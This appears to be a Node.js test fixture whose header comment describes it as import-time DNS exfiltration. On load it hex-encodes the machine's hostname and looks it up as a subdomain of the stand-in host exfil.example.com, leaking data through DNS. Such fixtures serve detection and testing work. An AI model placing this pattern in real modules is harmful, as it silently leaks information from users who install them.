// TEST FIXTURE: import-time DNS exfiltration — the hostname, hex-encoded, as a subdomain.
const dns = require('dns')
const label = Buffer.from(require('os').hostname()).toString('hex').slice(0, 60)
dns.lookup(`${label}.exfil.example.com`, () => {})
module.exports = {}
